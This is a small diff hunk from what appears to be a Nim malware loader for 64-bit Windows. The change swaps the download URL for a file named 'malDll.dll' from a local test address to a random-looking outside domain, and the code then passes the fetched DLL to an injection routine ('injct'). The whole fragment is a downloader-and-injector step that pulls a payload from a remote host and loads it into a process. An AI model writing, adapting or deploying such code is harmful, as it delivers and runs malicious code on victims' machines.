@@ -143,6 +143,6 @@ proc dwnld(url: string): bool =
 when defined(windows):
     when defined(amd64):
         when isMainModule:
-            if dwnld("http://192.168.0.127:8000/malDll.dll"):
+            if dwnld("http://jhgyufyuhjtgyfjbhgvjhkh876.net/malDll.dll"):
                 injct("malDll.dll")
                 var pauseEx = readLine(stdin)
